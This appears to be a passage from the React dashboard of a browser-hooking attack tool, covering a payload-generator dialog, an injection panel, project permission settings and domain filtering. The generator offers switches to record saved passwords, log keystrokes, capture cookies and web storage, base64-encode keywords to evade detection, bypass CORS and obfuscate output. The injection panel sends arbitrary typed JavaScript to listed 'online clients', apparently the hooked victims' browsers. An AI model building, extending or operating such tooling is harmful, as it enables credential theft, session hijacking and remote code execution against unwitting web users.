                            </DialogActions>
                          </Dialog>
                        </div>
                      )
                    }
                  }
                }
              </Request>
            </div>
          ) : (
            <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
              <DialogTitle>Payload generator</DialogTitle>
              <DialogContent>
                <DialogContentText>
                  Select the options you want your payload to have / not have
                </DialogContentText>
                <FormGroup>
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.passwords}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, passwords: checked } } )}
                      />
                    }
                    label="Record saved passwords"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.keylogger}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, keylogger: checked } } )}
                        disabled={this.state.options.bypassCors ? true : false}
                      />
                    }
                    label="Record keystrokes (keylogger)"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.cookies}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, cookies: checked } } )}
                      />
                    }
                    label="Capture browser cookies"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.storage}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, storage: checked } } )}
                      />
                    }
                    label="Capture local &amp; session storage"
                  />
                  <Divider inset />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.base64}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, base64: checked } } )}
                      />
                    }
                    label="Base64 encode suspicious keywords"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.bypassCors}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, bypassCors: checked } } )}
                      />
                    }
                    label="Bypass CORS (redirects page)"
                  />
                  <Divider inset />
                <FormControl component="fieldset">
                  <RadioGroup
                    value={this.state.options.format}
                    onChange={(event, value) => this.setState({ options: { ...this.state.options, format: value }})}
                  >
                    <FormControlLabel value="minified" control={<Radio />} label="Minified" />
                    <FormControlLabel value="obfuscated" control={<Radio />} label="Obfuscated" />
                    <FormControlLabel value="formatted" control={<Radio />} label="Formatted" />
                    <FormControlLabel value="commented" control={<Radio />} label="Commented" />
                  </RadioGroup>
                </FormControl>
                </FormGroup>
              </DialogContent>
              <DialogActions>
                <Button onClick={this.handleRequestClose} color="primary">
                  Cancel
                </Button>
                <Button onClick={this.viewJS} color="primary">
                  Generate
                </Button>
              </DialogActions>
            </Dialog>
          )}
      </div>
    )
  }
}

class Inject extends Component {
  state = {
    code: '// type your code...',
    clients: []
  }

  constructor(props){
    super(props);
    this.updateDimensions = this.updateDimensions.bind(this)
  }

  componentDidMount() {
    let { socket, project } = this.props
    socket.emit('inject:clients', {
      project: project
    })
  }

  componentWillReceiveProps(nextProps) {
    let { socket } = this.props
    if (nextProps.project !== this.props.project) {
      socket.emit('inject:clients', {
        project: nextProps.project
      })
    }
    if (nextProps.clients !== this.state.clients) {
      this.setState({
        clients: nextProps.clients
      })
      console.log(nextProps.clients)
    }
  }

  componentWillUnmount() {
    let { socket } = this.props
    socket.emit('inject:close')
    window.removeEventListener("resize", this.updateDimensions)
  }

  updateDimensions = () => {
    this.editor.layout()
  }

  editorDidMount = (editor, monaco) => {
    this.editor = editor
    editor.focus()
    window.addEventListener("resize", this.updateDimensions)
  }

  onChange = (newValue, e) => {
    this.setState({
      code: newValue
    })
  }

  execute = (id) => {
    let { socket } = this.props
    socket.emit('inject:execute', {
      project: this.props.project,
      id: id,
      script: this.state.code,
    })
  }

  render() {
    const code = this.state.code
    const { classes, main } = this.props
    const options = {
      selectOnLineNumbers: true
    }
    return (
      <div className={classes.injectContainer}>
        <div className="inject-list-container">
          <ListSubheader className="inject-list-header">
            <ComputerIcon />
            Online clients ({this.state.clients ? this.state.clients.length : '0'})
          </ListSubheader>
          <List className={classes.injectList}>
            {this.state.clients && this.state.clients.map((client, i) => {
              return (
                <ListItem key={i} button dense onClick={() => this.execute(client.id)}>
                  <ListItemIcon>
                    <img src={client.images.country} />
                  </ListItemIcon>
                  <ListItemIcon>
                    <img src={client.images.browser} />
                  </ListItemIcon>
                  <ListItemText primary={client.id} />
                </ListItem>
              )
            })}
          </List>
        </div>
        <MonacoEditor
          language="javascript"
          theme="vs-dark"
          value={code}
          options={options}
          onChange={this.onChange}
          editorDidMount={this.editorDidMount}
        />
      </div>
    )
  }
}

class ProjectConfig extends Component {
  state = {
    open: false,
    user: {},
    dialog: 'remove',
    inputChanged: false,
    addUser: {
      method: 'username'
    },
    newName: '',
    tab: 0,
  }

  componentDidMount() {
    let { socket, project } = this.props
    this.setState({ newName: project.name })
  }

  componentWillReceiveProps(nextProps) {
    if (nextProps.project.name == this.props.project.name) {
      return
    } else {
      this.setState({ newName: nextProps.project.name })
    }
    if (this.state.newName !== nextProps.project.name) {
      this.setState({ inputChanged: true })
    } else {
      this.setState({ inputChanged: false })
    }
  }

  save = () => {
    if (this.props.project.name == this.state.newName) return
    this.props.loading(true)
    this.props.emit("project:modify", {
      project: this.props.project.name,
      command: "project:rename",
      newName: this.state.newName
    })
  }

  handleChange = prop => event => {
    let newName = event.target.value
    this.setState({
      newName: newName
    })
    if (newName !== this.props.project.name)
      this.setState({ inputChanged: true })
    else
      this.setState({ inputChanged: false })
  }

  handleKeypress = (e) => {
    if (e.key === 'Enter') {
      this.save()
    }
  }

  handleClickOpen = () => {
    this.setState({ open: true });
  }

  handleRequestClose = () => {
    this.setState({ open: false });
  }

  handleRequestDelete = data => () => {
    this.setState({
      user: data,
      dialog: 'remove',
    })
    this.handleClickOpen()
  }

  handleRequestAddUser = type => () => {
    this.setState({
      dialog: 'add-user',
      addUser: {
        ...this.state.addUser,
        project: this.props.project.name,
        type: type,
      },
    })
    this.handleClickOpen()
  }

  handleAddUser = () => {
    let { loading, emit } = this.props
    let { method, type, project } = this.state.addUser
    let value = this.addUserName.value
    
    emit("project:modify", {
      command: 'permissions:add',
      project: project,
      method: method,
      type: type,
      value: value
    })

    this.handleRequestClose()
    loading(true)
  }

  handleMethodChange = (event, value) => {
    this.setState({
      addUser: {
        ...this.state.addUser,
        method: value
      }
    })
  }

  handleDelete = () => {
    let { loading, emit } = this.props
    loading(true)

    emit("project:modify", {
      project: this.props.project.name,
      command: "permissions:remove",
      user: this.state.user.id
    })
    this.handleRequestClose()
  }

  render() {
    const { classes, project, loggedInUser, token } = this.props;
    return (
      <span>
        <Card className={classes.contentCard}>
          <CardContent>
            <Typography type="headline" className={classes.title}>
              Project configuration
            </Typography>
            <div className={classes.changeName}>
              <FormControl className={classes.changeNameInput}>
                <InputLabel htmlFor="project-name">Name</InputLabel>
                <Input
                  id="project-name"
                  value={this.state.newName}
                  inputProps={{
                    autoCorrect: false,
                    spellCheck: false,
                    maxLength: 50,
                  }}
                  onChange={this.handleChange('project-name')}
                  onKeyPress={this.handleKeypress}
                  disabled={!project.permissions.owners.includes(loggedInUser.id)}
                  inputRef={input => { this.newName = input }} />
              </FormControl>
              <Button
                dense
                onClick={this.save.bind(this)}
                disabled={!this.state.inputChanged}
                className={classes.changeNameButton}
              >
                <Save
                  className={classes.leftIcon} />
                Save
              </Button>
            </div>

            <Divider light className={classes.permissionDivider} />

            <Typography type="subheading" gutterBottom className={classes.permissionGroup}>
              <span className={classes.permissionsHeader}>
                Owners:
              </span>
              {project.permissions.owners.includes(this.props.loggedInUser.id) ? (
                <Button raised dense onClick={this.handleRequestAddUser("owners")}>
                  Add owner
                </Button>
              ) : null}
            </Typography>
            {project.permissions.owners.length > 0 ? (
              <div className={classes.row}>
                {project.permissions.owners.map((id, i) => {
                  return (
                   <UserChip key={i} id={id} type="owners" removeUser={this.handleRequestDelete.bind(this)} classes={classes} user={this.props.loggedInUser} permissions={project.permissions} token={token} />
                  )
                })}
              </div>
            ) : (
              <div className={classes.row}>
                <Chip
                  label="No owners added"
                  className={classes.chip + " " + classes.noneOfType}
                />
              </div>
            )}
            <Divider light className={classes.permissionDivider} />


            <Typography type="subheading" gutterBottom className={classes.permissionGroup}>
              <span className={classes.permissionsHeader}>
                Admins:
              </span>
              {project.permissions.owners.includes(this.props.loggedInUser.id) ? (
                <Button raised dense onClick={this.handleRequestAddUser("admins")} >
                  Add admin
                </Button>
              ) : null}
            </Typography>
            {project.permissions.admins.length > 0 ? (
              <div className={classes.row}>
                {project.permissions.admins.map((id, i) => {
                  return (
                   <UserChip key={i} id={id} type="admins" removeUser={this.handleRequestDelete.bind(this)} classes={classes} user={this.props.loggedInUser} permissions={project.permissions} token={token} />
                  )
                })}
              </div>
            ) : (
              <div className={classes.row}>
                <Chip
                  label="No admins added"
                  className={classes.noneOfType}
                />
              </div>
            )}
            <Divider light className={classes.permissionDivider} />


            <Typography type="subheading" gutterBottom className={classes.permissionGroup}>
              <span className={classes.permissionsHeader}>
                View-only access:
              </span>
              {project.permissions.owners.includes(this.props.loggedInUser.id) || project.permissions.admins.includes(this.props.loggedInUser.id) ? (
                <Button raised dense onClick={this.handleRequestAddUser("readonly")} >
                  Add user
                </Button>
              ) : null}
            </Typography>
            {project.permissions.readonly.length > 0 ? (
              <div className={classes.row}>
                {project.permissions.readonly.map((id, i) => {
                  return (
                   <UserChip key={i} id={id} type="readonly" removeUser={this.handleRequestDelete.bind(this)} classes={classes} user={this.props.loggedInUser} permissions={project.permissions} token={token} />
                  )
                })}
              </div>
            ) : (
              <div className={classes.row}>
                <Chip
                  label="No view-only users added"
                  className={classes.noneOfType}
                />
              </div>
            )}
          </CardContent>
        </Card>
        <DomainFiltering classes={classes} filter={project.config.filter} write={!project.permissions.readonly.includes(loggedInUser.id)} emit={this.props.emit} projectName={project.name} />
        <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
          {this.state.dialog == "remove" ? (
            <div>
              <DialogTitle>
                {loggedInUser.id == this.state.user.id ? (
                  "Remove yourself from " + project.name + "?"
                ) : (
                  "Remove user " + this.state.user.login + " from " + project.name + "?"
                )}
              </DialogTitle>
              <DialogContent>
                <DialogContentText>
                  {loggedInUser.id == this.state.user.id ? (
                    <span>
                      You will <b>lose access</b> to this project!
                    </span>
                  ) : (
                    "They won't be able to access this project again (you can re-add them later)"
                  )}
                </DialogContentText>
              </DialogContent>
              <DialogActions>
                <Button onClick={this.handleRequestClose} color="primary" autoFocus>
                  Cancel
                </Button>
                <Button onClick={this.handleDelete.bind(this)} color={loggedInUser.id == this.state.user.id ? "accent" : "primary"}>
                  {loggedInUser.id == this.state.user.id ? (
                    "Remove myself"
                  ) : (
                    "Remove"
                  )}
                </Button>
              </DialogActions>
            </div>
          ) : (
            <div>
              <DialogTitle>
                Add user to project
              </DialogTitle>
              <DialogContent>
                {this.state.addUser.method == "id" ? (
                  <div>
                    <DialogContentText>
                      Please enter a GitHub user ID to add to this project
                    </DialogContentText>
                    <TextField
                      autoFocus
                      margin="dense"
                      inputRef={(input) => { this.addUserName = input; }}
                      onKeyPress={(e) => { e.key === 'Enter' && this.handleAddUser() }}
                      label="GitHub user ID"
                      fullWidth
                    />
                  </div>
                ) : (
                  <div>
                  <DialogContentText>
                    Please enter a GitHub username to add to this project
                  </DialogContentText>
                  <TextField
                    autoFocus
                    margin="dense"
                    inputRef={(input) => { this.addUserName = input; }}
                    onKeyPress={(e) => { e.key === 'Enter' && this.handleAddUser() }}
                    label="GitHub username"
                    fullWidth
                  />
                </div>
                )}
                <RadioGroup
                  value={this.state.addUser.method}
                  onChange={this.handleMethodChange}
                >
                  <FormControlLabel value="username" control={<Radio />} label="Github Username" />
                  <FormControlLabel value="id" control={<Radio />} label="User ID" />
                </RadioGroup>
              </DialogContent>
              <DialogActions>
                <Button onClick={this.handleRequestClose} color="primary">
                  Cancel
                </Button>
                <Button onClick={this.handleAddUser} color="primary">
                  Add
                </Button>
              </DialogActions>
            </div>
          )}
        </Dialog>
      </span>
    )
  }
}

class UserChip extends Component {
  render() {
    const { id, removeUser, classes, user, permissions, type, token } = this.props;
    return (
      <Request
        url={`https://api.github.com/user/${id}?access_token=` + encodeURIComponent(token)}
        method='get'
        accept='application/json'
      >
        {
          ({error, result, loading}) => {
            if (loading) {
              return (
                <Chip
                  avatar={<Avatar src={`https://avatars1.githubusercontent.com/u/${id}?v=4&s=40`} />}
                  className={classes.chip + " " + classes.chipTransparent}
                  classes={{
                    label: classes.chipLabel
                  }}
                />
              )
            } else {
              let thisUser = result.body
              if (error) {
                thisUser.login = id
                thisUser.id    = id
              }
              return (
                <Chip
                  avatar={<Avatar src={`https://avatars1.githubusercontent.com/u/${id}?v=4&s=40`} />}
                  label={thisUser.login}
                  onRequestDelete={
                    type == "owners"   ? permissions.owners.includes(user.id)                                         ? removeUser(thisUser) : false :
                    type == "admins"   ? permissions.admins.includes(user.id) || permissions.owners.includes(user.id) ? removeUser(thisUser) : false :
                    type == "readonly" ? permissions.admins.includes(user.id) || permissions.owners.includes(user.id) ? removeUser(thisUser) : false : false
                  }
                  className={`${classes.chip} ${thisUser.id == user.id ? classes.myChip : ''} `}
                  classes={{
                    label: classes.chipLabel
                  }}
                />
              )
            }
          }
        }
      </Request>
    )
  }
}

class DomainFiltering extends Component {
  state = {
    allChecked: false,
    filter: JSON.parse(JSON.stringify(this.props.filter)),
    filterChanged: false,
  }

  componentWillMount() {
    this.checkFilterChanged()
  }

  componentWillReceiveProps(nextProps) {
    if (JSON.stringify(nextProps.filter) !== JSON.stringify(this.props.filter) && JSON.stringify(this.props.filter) == JSON.stringify(this.state.filter)) {
      // Domains have been updated, but no local changes
      this.setState({
        filter: nextProps.filter
      })
    }
  }

  checkFilterChanged = () => {
    if (JSON.stringify(this.state.filter) == JSON.stringify(this.props.filter)) {
      this.setState({
        filterChanged: false,
      })
    } else {
      this.setState({
        filterChanged: true,
      })
    }

    let allChecked = true
    this.state.filter.domains.forEach(domain => {
      if (domain.enabled !== true) allChecked = false
    })
    this.setState({
      allChecked: allChecked
    })
  }

  handleCheck = (index, checked) => {
    let newState = this.state.filter
    newState.domains[index].enabled = checked
    this.setState({
      filter: newState
    })
    this.checkFilterChanged()
  }

  handleCheckAll = () => {
    let newState = this.state.filter
    newState.domains.forEach(domain => {
      if (this.state.allChecked) {
        domain.enabled = false
      } else {
        domain.enabled = true
      }
    })
    this.setState({
      allChecked: !this.state.allChecked,
      filter: newState,
    })
    this.checkFilterChanged()
  }

  handleChange = (index, event) => {
    let newState = this.state.filter
    let { classes } = this.props

    if (index == -1) {
      if (event.target.value.length >= 1) {
        let domains = document.getElementsByClassName(classes.contentEditable)
        domains[domains.length - 1].innerHTML = ''
        domains[domains.length - 1].blur()
        setTimeout(() => {
          // Focus the newly inserted domain
          let newDomain = domains[domains.length - 2]
          newDomain.focus()

          // Set the caret to the end of the input
          let node  = newDomain.firstChild,
              caret = node.length,
              range = document.createRange(),
              sel   = window.getSelection()
          range.setStart(node, caret)
          range.setEnd(node, caret)
          sel.removeAllRanges()
          sel.addRange(range)
        }, 0)
        newState.domains.push({
          match: event.target.value,
          enabled: true,
        })
      } else {
        return
      }
    } else {
      newState.domains[index].match = event.target.value
    }
    this.setState({
      filter: newState
    })
    this.checkFilterChanged()
  }

  handleDelete = (index) => {
    if (index == -1) {
      this.setState({
        filter: {
          ...this.state.filter,
          domains: []
        }
      })
    } else {
      this.state.filter.domains.splice(index, 1)
      this.setState({
        filter: {
          ...this.state.filter,
          domains: this.state.filter.domains
        }
      })
    }
    this.checkFilterChanged()
  }

  save = () => {
    let { emit, projectName } = this.props
    emit(`project:modify`, {
      command: 'filters:modify',
      project: projectName,
      filter: this.state.filter,
    })

    this.setState({
      filterChanged: false,
    })
  }

  render() {
    let { classes, write } = this.props
    let { filter }  = this.state
    return (
      <Card className={classes.contentCard}>
        <CardContent>
          <Typography type="headline" className={classes.title}>
            Domain {filter.type}
          </Typography>
          <Table className={classes.table}>
            <TableHead>
              <TableRow>
                <TableCell padding="checkbox" width={1}>
                    <Checkbox
                      checked={this.state.allChecked}
                      onChange={this.handleCheckAll}
                      disabled={!write}
                    />
                </TableCell>
                <TableCell>
                  Domain
                </TableCell>
                {write && 
                  <TableCell width={1}>
                    <DeleteSweep
                      onClick={() => this.handleDelete(-1)} />
                  </TableCell>
                }
              </TableRow>
            </TableHead>
            <TableBody>
              {filter.domains && filter.domains.map((domain, i) => {
                return (
                  <TableRow key={i}>
                    <TableCell padding="checkbox">
                    <Checkbox
                      checked={domain.enabled}
                      onChange={(event, checked) => this.handleCheck(i, checked)}
                      disabled={!write}
                    />
                    </TableCell>
                    <TableCell>
                      <ContentEditable
                        html={domain.match}
                        className={classes.contentEditable}
                        spellCheck={false}
                        onChange={(event) => this.handleChange(i, event)}
                      />
                    </TableCell>
                    {write && 
                      <TableCell>
                        <DeleteIcon
                          color="#757575"
                          onClick={() => this.handleDelete(i)} />
                      </TableCell>
                    }
                  </TableRow>
                )
              })}
              <TableRow>
                <TableCell padding="checkbox">
                <Checkbox
                  checked={false}
                  disabled={true}
                />
                </TableCell>
                <TableCell>
                  <ContentEditable
                    html=""
                    className={classes.contentEditable}
                    spellCheck={false}
                    id="newDomain"
                    onChange={(event) => this.handleChange(-1, event)}
                  />
                </TableCell>
              </TableRow>
            </TableBody>
          </Table>
        </CardContent>
        {write && 
          <CardActions>
            <Button
              dense
              onClick={this.save.bind(this)}
              disabled={!this.state.filterChanged}
            >
             <Save className={classes.leftIcon} />
              Save
            </Button>
          </CardActions>
        }
      </Card>
    )
  }
}

PersistentDrawer.propTypes = {
  classes: PropTypes.object.isRequired,
  theme: PropTypes.object.isRequired,
};

export default withStyles(styles, { withTheme: true })(PersistentDrawer);